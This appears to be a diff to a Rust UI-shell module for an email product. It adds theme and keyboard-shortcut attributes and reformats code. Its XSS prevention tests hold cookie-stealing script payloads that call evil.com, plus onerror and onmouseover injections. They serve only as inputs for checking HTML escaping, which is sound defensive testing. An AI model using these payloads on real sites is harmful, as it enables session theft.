@@ -21,17 +21,28 @@ pub struct ShellSpec {
 }
 
 pub const SHELLS: &[ShellSpec] = &[
-    ShellSpec { name: "WebDashboardShell", contract_id: "shell/web-dashboard", status: "implemented" },
-    ShellSpec { name: "ControlPlaneShell", contract_id: "shell/control-plane", status: "implemented" },
+    ShellSpec {
+        name: "WebDashboardShell",
+        contract_id: "shell/web-dashboard",
+        status: "implemented",
+    },
+    ShellSpec {
+        name: "ControlPlaneShell",
+        contract_id: "shell/control-plane",
+        status: "implemented",
+    },
 ];
 
 const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
 const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
 const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
-const WEB_IMPERSONATION_SOURCE: &str = include_str!("../baselines/web/impersonation-banner.baseline.txt");
+const WEB_IMPERSONATION_SOURCE: &str =
+    include_str!("../baselines/web/impersonation-banner.baseline.txt");
 const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
-const CONTROL_PLANE_SHELL_SOURCE: &str = include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
-const CONTROL_PLANE_SIDEBAR_SOURCE: &str = include_str!("../baselines/control-plane/sidebar.baseline.txt");
+const CONTROL_PLANE_SHELL_SOURCE: &str =
+    include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
+const CONTROL_PLANE_SIDEBAR_SOURCE: &str =
+    include_str!("../baselines/control-plane/sidebar.baseline.txt");
 
 pub fn ui_store_persistence_key() -> &'static str {
     "apexmail-ui"
@@ -47,6 +58,30 @@ pub fn toast_remove_delay_ms() -> usize {
 
 pub fn header_shortcut_hint() -> &'static str {
     "⌘K"
+}
+
+pub fn theme_storage_key() -> &'static str {
+    "apexmail-ui:theme"
+}
+
+pub fn shell_shortcut_registry() -> &'static [(&'static str, &'static str)] {
+    const SHORTCUTS: &[(&str, &str)] = &[
+        ("mod+k", "global-search"),
+        ("mod+b", "toggle-sidebar"),
+        ("mod+shift+d", "toggle-theme"),
+    ];
+    SHORTCUTS
+}
+
+fn render_shortcut_contract() -> String {
+    let entries = shell_shortcut_registry()
+        .iter()
+        .map(|(shortcut, action)| {
+            format!("<span data-shortcut=\"{shortcut}\" data-shortcut-action=\"{action}\"></span>")
+        })
+        .collect::<Vec<_>>()
+        .join("");
+    format!("<section hidden data-keyboard-shortcuts>{entries}</section>")
 }
 
 pub fn shell_source_catalog() -> [(&'static str, &'static str); 7] {
@@ -80,13 +115,14 @@ impl<'a> ShellHeader<'a> {
         let safe_query = html_escape(self.search_query);
         let safe_avatar = html_escape(self.avatar_fallback);
         format!(
-            "<header class=\"sticky top-0 z-40 flex h-16 items-center justify-between border-b border-surface-200/70 bg-gradient-to-r from-background via-background to-brand-50/50 backdrop-blur-2xl px-6\"><div class=\"flex items-center gap-4\"><button class=\"md:hidden\" aria-label=\"{} menu\" aria-expanded=\"{}\"><span class=\"h-5 w-5\">≡</span></button><div class=\"relative hidden md:block\"><input type=\"search\" role=\"searchbox\" aria-label=\"Search campaigns and contacts\" value=\"{}\" data-debounce-ms=\"300\" data-search-scope=\"campaigns,contacts\" class=\"w-64 pl-9 lg:w-80\" /><kbd class=\"pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-sm border\">{}</kbd></div></div><div class=\"flex items-center gap-2\"><button aria-label=\"Notifications\">{}</button>{}<div class=\"relative flex shrink-0 overflow-hidden rounded-lg border border-surface-200 shadow-sm h-10 w-10 rounded-lg\"><span class=\"flex h-full w-full items-center justify-center bg-surface-100 text-surface-600 font-bold text-xs uppercase tracking-wide\">{}</span></div></div></header>",
+            "<header class=\"sticky top-0 z-40 flex h-16 items-center justify-between border-b border-surface-200/70 bg-gradient-to-r from-background via-background to-brand-50/50 backdrop-blur-2xl px-6\"><div class=\"flex items-center gap-4\"><button class=\"md:hidden min-h-[44px] min-w-[44px]\" aria-label=\"{} menu\" aria-expanded=\"{}\" aria-controls=\"mobile-sidebar\" data-mobile-menu-breakpoint=\"md\" data-shortcut=\"mod+b\"><span class=\"h-5 w-5\">≡</span></button><div class=\"relative hidden md:block\"><input type=\"search\" role=\"searchbox\" aria-label=\"Search campaigns and contacts\" value=\"{}\" data-debounce-ms=\"300\" data-search-scope=\"campaigns,contacts\" data-shortcut=\"mod+k\" class=\"w-64 pl-9 lg:w-80\" /><kbd class=\"pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-sm border\">{}</kbd></div></div><div class=\"flex items-center gap-2\"><button aria-label=\"Notifications\">{}</button>{}<button type=\"button\" aria-label=\"Toggle dark mode\" aria-pressed=\"false\" data-theme-toggle=\"true\" data-theme-storage-key=\"{}\" data-shortcut=\"mod+shift+d\" class=\"inline-flex h-10 w-10 items-center justify-center rounded-lg border border-surface-200 bg-background text-surface-700\"><span aria-hidden=\"true\">◐</span></button><div class=\"relative flex shrink-0 overflow-hidden rounded-lg border border-surface-200 shadow-sm h-10 w-10 rounded-lg\"><span class=\"flex h-full w-full items-center justify-center bg-surface-100 text-surface-600 font-bold text-xs uppercase tracking-wide\">{}</span></div></div></header>",
             if self.mobile_menu_open { "Close" } else { "Open" },
             if self.mobile_menu_open { "true" } else { "false" },
             safe_query,
             header_shortcut_hint(),
             badge,
             if self.unread_count > 0 { format!("<span class=\"sr-only\">{} unread notifications</span>", self.unread_count) } else { String::new() },
+            theme_storage_key(),
             safe_avatar,
         )
     }
@@ -103,7 +139,15 @@ pub struct ImpersonationBanner<'a> {
 
 impl<'a> ImpersonationBanner<'a> {
     pub fn render_html(&self) -> String {
-        let error = self.end_session_error.map(|value| format!("<span class=\"text-xs font-medium text-white/95\">{}</span>", html_escape(value))).unwrap_or_default();
+        let error = self
+            .end_session_error
+            .map(|value| {
+                format!(
+                    "<span class=\"text-xs font-medium text-white/95\">{}</span>",
+                    html_escape(value)
+                )
+            })
+            .unwrap_or_default();
         let safe_tenant = html_escape(self.tenant_id);
         let safe_operator = html_escape(self.operator_name);
         let safe_time = html_escape(self.time_remaining);
@@ -146,17 +190,32 @@ pub struct WebDashboardShell<'a> {
 
 impl<'a> WebDashboardShell<'a> {
     pub fn render_html(&self) -> String {
-        let sidebar_width = if self.sidebar_collapsed { "w-16" } else { "w-64" };
+        let sidebar_width = if self.sidebar_collapsed {
+            "w-16"
+        } else {
+            "w-64"
+        };
         let mobile_overlay = if self.mobile_menu_open {
-            "<div class=\"fixed inset-0 z-40 bg-black/50 md:hidden\"></div><div class=\"fixed inset-y-0 left-0 z-50 w-64 md:hidden shadow-2xl\"></div>".to_string()
+            "<div class=\"fixed inset-0 z-40 bg-black/50 md:hidden\" aria-hidden=\"true\"></div><div id=\"mobile-sidebar\" role=\"navigation\" aria-label=\"Mobile navigation\" data-mobile-menu-breakpoint=\"md\" class=\"fixed inset-y-0 left-0 z-50 w-[min(20rem,calc(100vw-2rem))] md:hidden shadow-2xl\"></div>".to_string()
         } else {
             String::new()
         };
-        let banner = self.impersonation_banner.as_ref().map(ImpersonationBanner::render_html).unwrap_or_default();
-        let toast_surface = self.toast_surface.as_ref().map(ToastSurface::render_html).unwrap_or_default();
+        let banner = self
+            .impersonation_banner
+            .as_ref()
+            .map(ImpersonationBanner::render_html)
+            .unwrap_or_default();
+        let shortcut_contract = render_shortcut_contract();
+        let toast_surface = self
+            .toast_surface
+            .as_ref()
+            .map(ToastSurface::render_html)
+            .unwrap_or_default();
         format!(
-            "<div class=\"flex h-screen overflow-hidden bg-surface-50\">{}<aside class=\"hidden md:flex {}\" data-sidebar-storage-key=\"{}\" aria-label=\"Primary sidebar navigation\"></aside>{}<div class=\"flex flex-1 flex-col overflow-hidden\">{}<main class=\"relative flex-1 overflow-y-auto bg-gradient-to-br from-surface-50 via-background to-brand-50/40 p-4 md:p-6 lg:p-8 safe-area-inset-bottom\"><div class=\"relative\">{}</div></main>{}</div></div>",
+            "<div class=\"flex h-screen overflow-hidden bg-surface-50\" data-theme-mode=\"system\" data-theme-storage-key=\"{}\">{}{}<aside class=\"hidden md:flex {}\" data-sidebar-storage-key=\"{}\" aria-label=\"Primary sidebar navigation\"></aside>{}<div class=\"flex flex-1 flex-col overflow-hidden\">{}<main class=\"relative flex-1 overflow-y-auto bg-gradient-to-br from-surface-50 via-background to-brand-50/40 p-4 md:p-6 lg:p-8 safe-area-inset-bottom\"><div class=\"relative\">{}</div></main>{}</div></div>",
+            theme_storage_key(),
             banner,
+            shortcut_contract,
             sidebar_width,
             ui_store_persistence_key(),
             mobile_overlay,
@@ -183,17 +242,28 @@ pub struct ControlPlaneShell<'a> {
 
 impl<'a> ControlPlaneShell<'a> {
     pub fn render_html(&self) -> String {
-        let banner_markup = self.banners.iter().map(|banner| {
-            format!("<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>", control_plane_banner_class(banner.tone), html_escape(banner.message))
-        }).collect::<Vec<_>>().join("");
+        let banner_markup = self
+            .banners
+            .iter()
+            .map(|banner| {
+                format!(
+                    "<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>",
+                    control_plane_banner_class(banner.tone),
+                    html_escape(banner.message)
+                )
+            })
+            .collect::<Vec<_>>()
+            .join("");
         let mobile_sidebar = if self.mobile_menu_open {
             "translate-x-0"
         } else {
             "-translate-x-full"
         };
         format!(
-            "<div class=\"min-h-screen bg-background\">{}<div class=\"md:hidden fixed left-0 right-0 top-0 z-40 flex items-center justify-between p-4 bg-card border-b border-border\"><div class=\"flex items-center gap-3\"><div class=\"w-8 h-8 bg-primary rounded-lg flex items-center justify-center text-primary-foreground font-bold text-sm\">A</div><span class=\"text-sm font-semibold text-foreground\">Control Plane</span></div><button aria-expanded=\"{}\" aria-label=\"{} navigation menu\" class=\"p-2 min-h-[44px] min-w-[44px]\">≡</button></div><div class=\"hidden md:block\"><aside class=\"fixed left-0 top-0 h-screen w-64\" data-user-role=\"{}\"></aside></div><div class=\"md:hidden fixed left-0 top-0 h-screen z-50 transition-transform duration-300 {}\"><aside class=\"h-full w-64\"></aside></div><main class=\"ml-0 md:ml-64 p-4 md:p-8 pt-4 md:pt-8\"><div class=\"cp-page-frame\">{}</div></main></div>",
+            "<div class=\"min-h-screen bg-background\" data-theme-mode=\"system\" data-theme-storage-key=\"{}\">{}{}<div class=\"md:hidden fixed left-0 right-0 top-0 z-40 flex items-center justify-between p-4 bg-card border-b border-border\"><div class=\"flex items-center gap-3\"><div class=\"w-8 h-8 bg-primary rounded-lg flex items-center justify-center text-primary-foreground font-bold text-sm\">A</div><span class=\"text-sm font-semibold text-foreground\">Control Plane</span></div><button aria-expanded=\"{}\" aria-label=\"{} navigation menu\" aria-controls=\"control-plane-mobile-sidebar\" data-mobile-menu-breakpoint=\"md\" class=\"p-2 min-h-[44px] min-w-[44px]\">≡</button></div><div class=\"hidden md:block\"><aside class=\"fixed left-0 top-0 h-screen w-64\" data-user-role=\"{}\"></aside></div><div id=\"control-plane-mobile-sidebar\" role=\"navigation\" aria-label=\"Control plane mobile navigation\" data-mobile-menu-breakpoint=\"md\" class=\"md:hidden fixed left-0 top-0 h-screen z-50 transition-transform duration-300 {}\"><aside class=\"h-full w-[min(20rem,calc(100vw-2rem))]\"></aside></div><main class=\"ml-0 md:ml-64 p-4 md:p-8 pt-4 md:pt-8\"><div class=\"cp-page-frame\">{}</div></main></div>",
+            theme_storage_key(),
             banner_markup,
+            render_shortcut_contract(),
             if self.mobile_menu_open { "true" } else { "false" },
             if self.mobile_menu_open { "Close" } else { "Open" },
             self.user_role,
@@ -251,9 +321,11 @@ mod tests {
     #[test]
     fn exposes_sidebar_persistence_and_toast_contracts() {
         assert_eq!(ui_store_persistence_key(), "apexmail-ui");
+        assert_eq!(theme_storage_key(), "apexmail-ui:theme");
         assert_eq!(toast_store_global(), "__apexmailToastStore__");
         assert_eq!(toast_remove_delay_ms(), 5000);
         assert_eq!(header_shortcut_hint(), "⌘K");
+        assert!(shell_shortcut_registry().contains(&("mod+k", "global-search")));
     }
 
     #[test]
@@ -273,11 +345,17 @@ mod tests {
             ending_session: false,
         }
         .render_html();
-        let toast_surface = ToastSurface { toasts: vec!["<div>Toast</div>"] }.render_html();
+        let toast_surface = ToastSurface {
+            toasts: vec!["<div>Toast</div>"],
+        }
+        .render_html();
 
         assert!(header.contains("role=\"searchbox\""));
         assert!(header.contains("data-debounce-ms=\"300\""));
+        assert!(header.contains("data-shortcut=\"mod+k\""));
         assert!(header.contains("⌘K"));
+        assert!(header.contains("data-theme-toggle=\"true\""));
+        assert!(header.contains("data-mobile-menu-breakpoint=\"md\""));
         assert!(header.contains("3 unread notifications"));
         assert!(header.contains("aria-label=\"Open menu\""));
         assert!(banner.contains("Impersonation Mode"));
@@ -307,24 +385,38 @@ mod tests {
                 end_session_error: Some("Could not end impersonation session."),
                 ending_session: false,
             }),
-            toast_surface: Some(ToastSurface { toasts: vec!["<div>Saved</div>"] }),
+            toast_surface: Some(ToastSurface {
+                toasts: vec!["<div>Saved</div>"],
+            }),
         }
         .render_html();
         let control = ControlPlaneShell {
             mobile_menu_open: true,
             user_role: "admin",
-            banners: vec![OperationalBanner { tone: "warning", message: "Safe mode active" }],
+            banners: vec![OperationalBanner {
+                tone: "warning",
+                message: "Safe mode active",
+            }],
             child_html: "<section>Ops</section>",
         }
         .render_html();
-        let marketing = MarketingShell { child_html: "<section>Hero</section>" }.render_html();
+        let marketing = MarketingShell {
+            child_html: "<section>Hero</section>",
+        }
+        .render_html();
 
         assert!(web.contains("data-sidebar-storage-key=\"apexmail-ui\""));
+        assert!(web.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
+        assert!(web.contains("data-keyboard-shortcuts"));
+        assert!(web.contains("data-shortcut-action=\"toggle-theme\""));
+        assert!(web.contains("role=\"navigation\" aria-label=\"Mobile navigation\""));
         assert!(web.contains("w-16"));
         assert!(web.contains("Dashboard"));
         assert!(web.contains("Could not end impersonation session."));
         assert!(web.contains("Saved"));
         assert!(control.contains("data-user-role=\"admin\""));
+        assert!(control.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
+        assert!(control.contains("data-keyboard-shortcuts"));
         assert!(control.contains("Safe mode active"));
         assert!(control.contains("aria-label=\"Close navigation menu\""));
         assert!(control.contains("translate-x-0"));
@@ -334,7 +426,7 @@ mod tests {
         assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
     }
 
-// ── XSS Prevention Tests ───────────────────────────────────
+    // ── XSS Prevention Tests ───────────────────────────────────
 
     #[test]
     fn header_search_query_escapes_xss() {
@@ -346,10 +438,16 @@ mod tests {
             mobile_menu_open: false,
         }
         .render_html();
-// Raw XSS payload must NOT appear in output
-        assert!(!header.contains(xss_payload), "raw XSS payload found in header output");
-// Escaped version must appear instead
-        assert!(header.contains("&lt;img src=x onerror="), "escaped XSS not found in header");
+        // Raw XSS payload must NOT appear in output
+        assert!(
+            !header.contains(xss_payload),
+            "raw XSS payload found in header output"
+        );
+        // Escaped version must appear instead
+        assert!(
+            header.contains("&lt;img src=x onerror="),
+            "escaped XSS not found in header"
+        );
     }
 
     #[test]
@@ -362,13 +460,20 @@ mod tests {
             mobile_menu_open: false,
         }
         .render_html();
-        assert!(!header.contains("<script>"), "unescaped script tag in avatar output");
-        assert!(header.contains("&lt;script&gt;"), "escaped script tag not found");
+        assert!(
+            !header.contains("<script>"),
+            "unescaped script tag in avatar output"
+        );
+        assert!(
+            header.contains("&lt;script&gt;"),
+            "escaped script tag not found"
+        );
     }
 
     #[test]
     fn impersonation_banner_escapes_tenant_id() {
-        let xss_payload = "<script>document.location='https://evil.com?c='+document.cookie</script>";
+        let xss_payload =
+            "<script>document.location='https://evil.com?c='+document.cookie</script>";
         let banner = ImpersonationBanner {
             tenant_id: xss_payload,
             operator_name: "Safe Operator",
@@ -377,8 +482,14 @@ mod tests {
             ending_session: false,
         }
         .render_html();
-        assert!(!banner.contains("<script>"), "unescaped script in tenant_id");
-        assert!(banner.contains("&lt;script&gt;"), "escaped tenant_id not found");
+        assert!(
+            !banner.contains("<script>"),
+            "unescaped script in tenant_id"
+        );
+        assert!(
+            banner.contains("&lt;script&gt;"),
+            "escaped tenant_id not found"
+        );
     }
 
     #[test]
@@ -392,7 +503,10 @@ mod tests {
             ending_session: false,
         }
         .render_html();
-        assert!(!banner.contains("onerror=alert(1)>"), "unescaped img tag in operator_name");
+        assert!(
+            !banner.contains("onerror=alert(1)>"),
+            "unescaped img tag in operator_name"
+        );
     }
 
     #[test]
@@ -406,9 +520,15 @@ mod tests {
             ending_session: false,
         }
         .render_html();
-// The angle brackets of the <div> tag must be escaped
-        assert!(!banner.contains("<div onmouseover"), "unescaped <div> tag in error message");
-        assert!(banner.contains("&lt;div onmouseover="), "escaped error message not found");
+        // The angle brackets of the <div> tag must be escaped
+        assert!(
+            !banner.contains("<div onmouseover"),
+            "unescaped <div> tag in error message"
+        );
+        assert!(
+            banner.contains("&lt;div onmouseover="),
+            "escaped error message not found"
+        );
     }
 
     #[test]
@@ -422,21 +542,34 @@ mod tests {
             ending_session: false,
         }
         .render_html();
-        assert!(!banner.contains("<script>alert(1)</script>"), "unescaped script in time_remaining");
+        assert!(
+            !banner.contains("<script>alert(1)</script>"),
+            "unescaped script in time_remaining"
+        );
     }
 
     #[test]
     fn control_plane_banner_escapes_message() {
-        let xss_payload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
+        let xss_payload =
+            "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
         let control = ControlPlaneShell {
             mobile_menu_open: false,
             user_role: "admin",
-            banners: vec![OperationalBanner { tone: "critical", message: xss_payload }],
+            banners: vec![OperationalBanner {
+                tone: "critical",
+                message: xss_payload,
+            }],
             child_html: "<section>Ops</section>",
         }
         .render_html();
-        assert!(!control.contains("<script>fetch"), "unescaped script in control plane banner");
-        assert!(control.contains("&lt;script&gt;"), "escaped banner message not found");
+        assert!(
+            !control.contains("<script>fetch"),
+            "unescaped script in control plane banner"
+        );
+        assert!(
+            control.contains("&lt;script&gt;"),
+            "escaped banner message not found"
+        );
     }
 
     #[test]
